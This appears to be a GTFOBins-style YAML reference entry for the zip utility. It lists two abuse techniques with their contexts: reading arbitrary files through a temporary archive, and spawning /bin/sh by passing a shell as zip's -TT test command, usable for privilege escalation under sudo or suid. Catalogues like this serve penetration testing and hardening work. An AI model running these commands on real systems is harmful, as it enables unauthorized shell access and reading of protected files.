---
functions:
  file-read:
  - code: |-
      zip /path/to/temp-file /path/to/input-file
      unzip -p /path/to/temp-file
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
